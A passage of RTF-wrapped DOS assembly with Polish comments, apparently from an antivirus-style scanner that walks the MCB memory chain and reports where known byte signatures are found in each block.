\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        int   21h                         ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   ah,52h                      ; funkcja DOS - wez adres listy list LL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        int   21h                         ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   ax,es:[bx-2]                ; wez adres pierwszego bloku MCB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NastepnyMCB:                             ; kolejne bloki MCB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   es,ax                       ; ES=MCB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   bl,byte ptr es:[0]          ; zachowaj info o znaczniku bloku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   dx,es:[0003]                ; DX=rozmiar bloku MCB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   cx,es:[0001]                ; CX=adres PSP z bloku MCB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        Call  SzukajWBloku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        stc                               ; +1 w dodawaniu ponizej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        adc   ax,word ptr es:[0003]       ; dodaj rozmiar bloku MCB+1}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                          ; AX=nastepny blok MCB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        cmp   bl,'M'                      ; czy to posredni blok ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        je    NastepnyMCB                 ; TAK - przegladaj}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        cmp   bl,'Z'                      ; czy to ostatni blok ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        je    OstatniBlokMCB              ; TAK - zakoncz przegladanie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                          ; zly blok MCB - naruszona struktura}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        lea   si,TeZlyMCB                 ; \\ wyswietl komunikat}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        Call  DrukLN                      ; / o blednym bloku MCB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch OstatniBlokMCB:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        pop   bx                          ; przywroc info o UMB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   bh,0                        ; BX=BL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   ax,5803h                    ; funkcja DOS - dolacz/odlacz bloki UMB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        int   21h                         ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        pop   dx cx bx ax es              ; przywroc zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        cmp   IloscSygn,0                 ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        jne   SzukajHeurPowrot            ;  \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                          ;   - jezeli nie znalazl zadnej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        lea   si,TeNieMaSygnatur          ;  /  sygnatury to wyswietl komunikat}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        Call  DrukLN                      ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SzukajHeurPowrot:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        ret                               ; powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-----------------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SzukajWBloku:                            ; szuka sygnatury w bloku MCB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                          ; AX=blok MCB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                          ; DX=dlugosc bloku w paragrafach}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        push  ds es ax bx cx dx si di     ; zachowaj zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        or    cx,cx                       ; czy blok jest nieuzywany ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        je    SzukajWBlokuPowrot          ; TAK - nie sprawdzaj i powroc}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   AdresMCB,ax                 ; zapamietaj adres MCB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        inc   ax                          ; ES:0= MCB+1:0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   es,ax                       ; ES wskazuje na dane w bloku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        lea   si,TeSprawdzam              ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        Call  Druk                        ;  \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        lea   si,TeBlokMCB                ;   \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        Call  Druk                        ;    \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   ax,AdresMCB                 ;     \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        Call  DrukHEX16                   ;      \\  wypisz info o szukaniu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        lea   si,TeRozmiar                ;      /  w bloku MCB i podaj jego}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        Call  Druk                        ;     /   adres, dlugosc}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   ax,dx                       ;    /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        Call  DrukHex16                   ;   /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        lea   si,TeParagraf               ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        Call  DrukLn                      ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   bx,cs                       ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   ax,es                       ;  \\ czy to MCB programu HEUR ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        cmp   ax,bx                       ;  / TAK-nie sprawdzaj kodu programu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        jne   InnyBlok                    ; /      ale sprawdz poza nim}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   ax,DlugProgPara}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        sub   dx,ax                       ; odejmij dlugosc kodu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        or    dx,dx                       ; \\ czy nie odjete za duzo ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        jz    SzukajWBlokuPowrot          ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        add   ax,AdresMCB                 ; \\ ES=dane poza kodem programu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   es,ax                       ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch InnyBlok:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        or    dx,dx                       ; \\ pomin blok, gdy dlugosc =0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        je    SzukajWBlokuPowrot          ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   IloscBiezSygn,0             ; licznik wystapien w bloku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        cld                               ; SI:=SI+1, DI:=DI+1 po oper. lancuchowych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        xor   di,di                       ; dane sa pod ES:0000}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SzukajDalej:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   bx,IleSygnatur              ; ustaw licznik sygnatur}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        lea   si,Sygnatury                ; podaj, skad pobierac sygnatury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SzukajSygnature:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        push  si                          ; zachowaj zmieniane SI}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   bp,si                       ; zachowaj ofset do nazwy sygnatury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        add   si,size SygnNazwa+size SygnDlug}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                          ; dodaj ofset do sygnatury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        lodsb                             ; wez 1-szy bajt sygnatury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        scasb                             ; czy=bajt w pamieci ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        jnz   NastepnaSygnatura           ; NIE - sprawdz kolejna sygnature}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                          ; TAK - porownaj cala sygnature}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   cx,word ptr ds:[si-3]       ; wez dlugosc sygnatury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        dec   cx                          ; pierwszego bajtu nie trzeba}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                          ; porownywac}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        push  di                          ; DI jest pozniej potrzebne wiec zachowaj}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        rep   cmpsb                       ; porownaj sygnature z pamiecia}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        pop   di                          ; przywroc DI}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        jnz   NastepnaSygnatura           ; NIE - nie ma sygnatury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                          ; TAK - sygnatura znaleziona}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        inc   IloscSygn                   ; zwieksz ilosc wystapien (globalna)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        inc   IloscBiezSygn               ; zwieksz ilosc wystapien (w MCB)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        lea   si,TeAdres                  ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        Call  Druk                        ;  \\      wyswietl jaka sygnatura}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   ax,es                       ;   \\     zostala znaleziona}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        Call  DrukHEX16                   ;    \\    i pod jakim adresem}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   ax,0E3Ah                    ;     \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        int   10h                         ;      \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   ax,di                       ;       \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        dec   ax                          ;       /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        Call  DrukHex16                   ;      /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        lea   si,TeSygnatura              ;     /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        Call  Druk                        ;    /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   si,bp                       ;   /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        add   si,SygnNazwa                ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        Call  DrukLn                      ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NastepnaSygnatura:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        pop   si                          ; przywroc SI}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        add   si,DlugoscSygnatury         ; i ustaw na nastepna sygnature}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        dec   di                          ; ustaw wskaznik na poprzedni bajt}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        dec   bx                          ; zmniejsz licznik sygnatur}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        jnz   SzukajSygnature             ; jezeli nie, to sprawdz kolejna sygnature}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NastepnyBajt:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        inc   di                          ; wskaznik na nastepny bajt w bloku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        and   di,15                       ; czy ofset>15}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        jnz   SzukajDalej                 ; NIE - szukaj sygnatur}{\f2\fs24\lang1045{\*\listtag0}\par}
